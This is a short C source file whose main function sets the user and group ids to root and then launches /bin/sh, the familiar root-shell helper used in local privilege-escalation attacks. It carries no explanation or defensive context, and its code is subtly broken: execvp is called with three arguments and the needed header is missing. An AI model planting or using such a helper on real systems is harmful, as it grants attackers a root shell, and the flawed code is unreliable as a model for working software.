#include <stdio.h>
int main(void){
  setuid(0);
  setgid(0);
  setuid(0);
  setgid(0);
  execvp("/bin/sh", NULL, NULL);
}
  
